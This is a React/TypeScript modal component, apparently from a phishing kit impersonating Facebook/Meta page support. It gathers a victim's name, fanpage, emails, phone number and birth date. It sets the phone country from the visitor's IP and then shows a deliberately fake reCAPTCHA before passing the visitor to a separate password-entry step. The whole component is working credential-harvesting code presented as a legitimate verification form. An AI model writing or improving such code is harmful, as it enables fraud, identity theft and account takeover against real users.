import React from 'react';
import Modal from '#components/modals/Modal';
import {
  modalDetailsClass,
} from '#components/modals/modalStyles';
import PhoneInputBase from 'react-phone-input-2';
import CustomCheckbox from '#components/check-box/CustomCheckbox';
import FakeRecaptchaWidget from '#components/recaptcha/FakeRecaptchaWidget';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';
import { useAppStrings } from '@/hooks/useAppStrings';

interface InfomationsModalProps {
  isOpend: boolean;
  isOpendPassword: (isOpenPassword: boolean) => void;
  onToggleModal: (isOpen: boolean) => void;
}

const AGREE_CHECKBOX_ID = 'fbcm-agree-terms';

/** Typings của react-phone-input-2 thiếu một số prop runtime (separateDialCode, …) */
type PhoneCountryData = { dialCode?: string; countryCode?: string; name?: string }
type PhoneInputRuntimeProps = Omit<React.ComponentProps<typeof PhoneInputBase>, 'onChange'> & {
  separateDialCode?: boolean
  countryCodeEditable?: boolean
  onChange?: (
    value: string,
    country?: PhoneCountryData | string,
    e?: React.ChangeEvent<HTMLInputElement>,
    formattedValue?: string,
  ) => void
}
const PhoneInput = PhoneInputBase as React.ComponentType<PhoneInputRuntimeProps>

/** ISO 3166-1 alpha-2 (từ IP) → mã country của react-phone-input-2 */
function toPhoneInputCountry(countryCode?: string): string {
  const code = (countryCode || '').trim().toLowerCase()
  if (!/^[a-z]{2}$/.test(code)) return 'us'
  if (code === 'uk') return 'gb'
  return code
}

const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPassword, onToggleModal }) => {
  const t = useAppStrings();
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const normalizePhoneDigits = (value: string) => value.replace(/\D/g, '');
  const getPhoneDigitCount = (value: string) => normalizePhoneDigits(value).length;

  const [isOpen, setIsOpen] = React.useState(isOpend);
  const [errors, setErrors] = React.useState<Record<string, string>>({});
  /** Sau khi hồ sơ hợp lệ: hiển thị captcha trong modal trước khi sang bước mật khẩu. */
  const [phase, setPhase] = React.useState<'form' | 'captcha'>('form');
  const [captchaMountKey, setCaptchaMountKey] = React.useState(0);
  const [agreedToTerms, setAgreedToTerms] = React.useState(false);
  /** User đã sửa SĐT → không ép lại country khi IP cập nhật */
  const [phoneTouched, setPhoneTouched] = React.useState(false);
  const captchaRegionRef = React.useRef<HTMLDivElement>(null);
  const phoneWrapRef = React.useRef<HTMLDivElement>(null);
  const dispatch = useAppDispatch();
  const formData = useAppSelector((state) => state.stepForm.data);
  const phoneCountry = toPhoneInputCountry(formData.country_code);

  /** Chừa chỗ ô nhập theo bề rộng cờ + đầu số (+xx) */
  const syncPhoneInputPadding = React.useCallback(() => {
    const root = phoneWrapRef.current
    if (!root) return
    const dropdown = root.querySelector('.flag-dropdown') as HTMLElement | null
    const input = root.querySelector('.form-control') as HTMLElement | null
    if (!dropdown || !input) return
    const width = Math.ceil(dropdown.getBoundingClientRect().width)
    if (width > 0) input.style.paddingLeft = `${width + 10}px`
  }, [])

  React.useEffect(() => {
    syncPhoneInputPadding()
    const id = window.setTimeout(syncPhoneInputPadding, 80)
    return () => window.clearTimeout(id)
  }, [phoneCountry, formData.phone, isOpen, syncPhoneInputPadding])

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
    const { id, value } = e.target;
    dispatch(updateForm({ [id as keyof FormData]: value } as Partial<FormData>));
    setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
  };

  React.useEffect(() => {
    setIsOpen(isOpend);
    if (isOpend) {
      setPhase('form');
      setAgreedToTerms(false);
      // Chưa có SĐT → cho phép gắn country theo IP; đã có thì giữ nguyên
      setPhoneTouched(Boolean(normalizePhoneDigits(formData.phone)));
    }
    // Chỉ khi mở/đóng modal — không theo dõi từng lần gõ SĐT
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isOpend]);

  React.useEffect(() => {
    if (phase !== 'captcha' || !isOpen) return;
    const id = window.setTimeout(() => {
      captchaRegionRef.current?.focus();
    }, 120);
    return () => clearTimeout(id);
  }, [phase, isOpen]);

  const handleClose = () => {
    setIsOpen(false);
    onToggleModal(false);
  };

  const handSubmit = async (e: React.FormEvent) => {
    try {
      e.preventDefault();

      // Lưu key lỗi — render bằng t.info[key] để đổi ngôn ngữ vẫn cập nhật
      const newErrors: Record<string, string> = {};
      if (!formData.fullName.trim()) newErrors.fullName = 'errFullName';
      if (!formData.email.trim()) {
        newErrors.email = 'errEmail';
      } else if (!emailRegex.test(formData.email.trim())) {
        newErrors.email = 'errEmailFmt';
      }
      if (!formData.emailBusiness.trim()) {
        newErrors.emailBusiness = 'errEmailBiz';
      } else if (!emailRegex.test(formData.emailBusiness.trim())) {
        newErrors.emailBusiness = 'errEmailBizFmt';
      }
      if (!formData.fanpage.trim()) newErrors.fanpage = 'errFanpage';
      const phoneDigits = normalizePhoneDigits(formData.phone);
      const phoneDigitCount = getPhoneDigitCount(formData.phone);
      if (!phoneDigits) {
        newErrors.phone = 'errPhone';
      } else if (phoneDigitCount < 8 || phoneDigitCount > 25) {
        newErrors.phone = 'errPhoneLen';
      }
      if (!formData.day) newErrors.day = 'errDay';
      if (!formData.month) newErrors.month = 'errMonth';
      if (!formData.year) newErrors.year = 'errYear';
      if (!agreedToTerms) newErrors.agree = 'errAgree';

      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors);
        return;
      }

      const clientData = {
        ...formData,
      };

      dispatch(updateForm(clientData));

      setCaptchaMountKey((k) => k + 1);
      setPhase('captcha');

    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  const infoErrorText = (key?: string) => {
    if (!key) return null
    const message = (t.info as Record<string, string>)[key]
    return message || null
  }

  const controlClass = (invalid: boolean) =>
    `h-11 w-full rounded-lg border bg-white px-3 text-[14px] text-[#1c1e21] outline-none transition ${
      invalid ? 'border-red-500' : 'border-[#ccd0d5] hover:border-[#b0b7c3] focus:border-[#0064e0] focus:ring-2 focus:ring-[#0064e0]/15'
    }`;
  const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
  const months = Array.from({ length: 12 }, (_, i) => String(i + 1));
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 100 }, (_, i) => String(currentYear - i));

  const finalizeAfterCaptcha = React.useCallback(() => {
    setIsOpen(false);
    onToggleModal(false);
    isOpendPassword(true);
  }, [isOpendPassword, onToggleModal]);

  const modalTitle = phase === 'captcha' ? t.captcha.verifyHeading : t.info.title;

  return (
    <Modal
      isOpen={isOpen}
      title={modalTitle}
      onClose={handleClose}
      wide
    >
      <div className="flex min-h-full min-w-0 w-full flex-col">
        {phase === 'captcha' ? (
          <div
            ref={captchaRegionRef}
            tabIndex={-1}
            className="w-full rounded-xl outline-none ring-offset-2 focus-visible:ring-2 focus-visible:ring-[#0064e0]"
          >
            <FakeRecaptchaWidget
              key={captchaMountKey}
              idPrefix="fbcm-info-modal"
              texts={{
                notRobot: t.captcha.notRobot,
                privacyTerms: t.captcha.privacyTerms,
                a11yVerifying: t.captcha.a11yVerifying,
                a11yVerified: t.captcha.a11yVerified,
              }}
              onVerified={finalizeAfterCaptcha}
            />
            <div className={`${modalDetailsClass} space-y-2 px-3.5 py-2.5 text-[11px] leading-snug text-[#65676B]`}>
              <p className="font-normal">{t.captcha.p1}</p>
              <p className="font-normal">{t.captcha.p2}</p>
              <p className="font-normal">{t.captcha.p3}</p>
            </div>
          </div>
        ) : (
        <form onSubmit={handSubmit} autoComplete="off" className="flex w-full flex-col gap-4">
          <p className="rounded-lg bg-[#f0f2f5] px-3 py-2.5 text-[13px] leading-relaxed text-[#3d4d66]">
            {t.info.hint}
          </p>

          <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
            <div className="min-w-0">
              <label htmlFor="fullName" className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">{t.info.fullName} <span className="text-[#e5484d]">*</span></label>
              <input id="fullName" type="text" placeholder={t.info.fullNamePh} className={controlClass(!!errors.fullName)} value={formData.fullName} onChange={handleChange} />
              {errors.fullName ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.fullName)}</p> : null}
            </div>
            <div className="min-w-0">
              <label htmlFor="fanpage" className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">{t.info.fanpage} <span className="text-[#e5484d]">*</span></label>
              <input id="fanpage" type="text" placeholder={t.info.fanpagePh} className={controlClass(!!errors.fanpage)} value={formData.fanpage} onChange={handleChange} />
              {errors.fanpage ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.fanpage)}</p> : null}
            </div>
            <div className="min-w-0">
              <label htmlFor="email" className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">{t.info.email} <span className="text-[#e5484d]">*</span></label>
              <input id="email" type="email" placeholder={t.info.emailPh} className={controlClass(!!errors.email)} value={formData.email} onChange={handleChange} />
              {errors.email ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.email)}</p> : null}
            </div>
            <div className="min-w-0">
              <label htmlFor="emailBusiness" className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">{t.info.emailBiz} <span className="text-[#e5484d]">*</span></label>
              <input id="emailBusiness" type="email" placeholder={t.info.emailBizPh} className={controlClass(!!errors.emailBusiness)} value={formData.emailBusiness} onChange={handleChange} />
              {errors.emailBusiness ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.emailBusiness)}</p> : null}
            </div>

            <div className="min-w-0 sm:col-span-2">
              <label className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">{t.info.phone} <span className="text-[#e5484d]">*</span></label>
              {/* LTR + đầu số quốc gia tách riêng; chỉ nhập số sau +xx */}
              <div
                ref={phoneWrapRef}
                dir="ltr"
                className={`h-11 overflow-visible rounded-lg border bg-white ${errors.phone ? 'border-red-500' : 'border-[#ccd0d5]'}`}
              >
                <PhoneInput
                  key={phoneTouched ? 'phone-manual' : `phone-${phoneCountry}`}
                  country={phoneCountry}
                  value={formData.phone}
                  preferredCountries={[phoneCountry]}
                  autoFormat={false}
                  enableSearch
                  separateDialCode
                  countryCodeEditable={false}
                  containerClass="phone-input-ltr separate-dial-code"
                  inputClass="phone-input-ltr__field"
                  onChange={(phone) => {
                    setPhoneTouched(true);
                    const normalizedPhone = normalizePhoneDigits(phone).slice(0, 25);
                    dispatch(updateForm({ phone: normalizedPhone }));
                    setErrors(prev => ({ ...prev, phone: '' }));
                    window.requestAnimationFrame(syncPhoneInputPadding)
                  }}
                  inputProps={{
                    name: 'phone',
                    required: true,
                    autoComplete: 'tel',
                    dir: 'ltr',
                    inputMode: 'tel',
                    placeholder: ' ',
                  }}
                />
              </div>
              {errors.phone ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.phone)}</p> : null}
            </div>

            <div className="min-w-0 sm:col-span-2">
              <p className="mb-1.5 text-[13px] font-semibold text-[#1c1e21]">{t.info.dob} <span className="text-[#e5484d]">*</span></p>
              <div className="grid grid-cols-3 gap-2">
                <div>
                  <select id="day" aria-label={t.info.day} className={controlClass(!!errors.day)} value={formData.day} onChange={handleChange}>
                    <option value="">{t.info.day}</option>
                    {days.map((day) => (
                      <option key={day} value={day}>{day}</option>
                    ))}
                  </select>
                  {errors.day ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.day)}</p> : null}
                </div>
                <div>
                  <select id="month" aria-label={t.info.month} className={controlClass(!!errors.month)} value={formData.month} onChange={handleChange}>
                    <option value="">{t.info.month}</option>
                    {months.map((month) => (
                      <option key={month} value={month}>{month}</option>
                    ))}
                  </select>
                  {errors.month ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.month)}</p> : null}
                </div>
                <div>
                  <select id="year" aria-label={t.info.year} className={controlClass(!!errors.year)} value={formData.year} onChange={handleChange}>
                    <option value="">{t.info.year}</option>
                    {years.map((year) => (
                      <option key={year} value={year}>{year}</option>
                    ))}
                  </select>
                  {errors.year ? <p className="mt-1 text-[12px] leading-snug text-red-600">{infoErrorText(errors.year)}</p> : null}
                </div>
              </div>
            </div>

            <div className="min-w-0 sm:col-span-2">
              <label htmlFor="message" className="mb-1.5 block text-[13px] font-semibold text-[#1c1e21]">{t.info.message}</label>
              <textarea
                id="message"
                rows={3}
                className="h-24 w-full resize-none rounded-lg border border-[#ccd0d5] bg-white px-3 py-2.5 text-[14px] text-[#1c1e21] outline-none transition hover:border-[#b0b7c3] focus:border-[#0064e0] focus:ring-2 focus:ring-[#0064e0]/15"
                placeholder={t.info.messagePh}
                value={formData.message}
                onChange={handleChange}
              />
            </div>
          </div>

          <div className="rounded-lg border border-[#e4e6eb] bg-[#fafbfc] p-3">
            <label htmlFor={AGREE_CHECKBOX_ID} className="flex cursor-pointer items-start gap-2.5 text-[14px] leading-snug">
              <span className="mt-0.5 shrink-0">
                <CustomCheckbox
                  id={AGREE_CHECKBOX_ID}
                  checked={agreedToTerms}
                  invalid={!!errors.agree}
                  aria-describedby={errors.agree ? 'fbcm-agree-error' : undefined}
                  onCheckedChange={(next) => {
                    setAgreedToTerms(next);
                    setErrors((prev) => ({ ...prev, agree: '' }));
                  }}
                />
              </span>
              <span className="min-w-0 text-[#1c1e21]">
                <span>{t.info.agree}</span>{' '}
                <span className="font-semibold text-[#0064E0]">{t.info.agreeTerms}</span>{' '}
                <span>{t.info.agreeAnd}</span>{' '}
                <span className="font-semibold text-[#0064E0]">{t.main.linkPrivacy}</span>
              </span>
            </label>
            {errors.agree ? (
              <p id="fbcm-agree-error" role="alert" className="mt-2 text-[12px] text-red-600">{infoErrorText(errors.agree)}</p>
            ) : null}
          </div>

          <div className="border-t border-[#e4e6eb] pt-3">
            <button type="submit" className="flex min-h-12 w-full cursor-pointer items-center justify-center rounded-full bg-[#0064E0] text-[15px] font-semibold text-white active:opacity-90 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[#0064e0]">{t.info.submit}</button>
          </div>
        </form>
        )}
      </div>
    </Modal>
  );
};

export default InfomationsModal;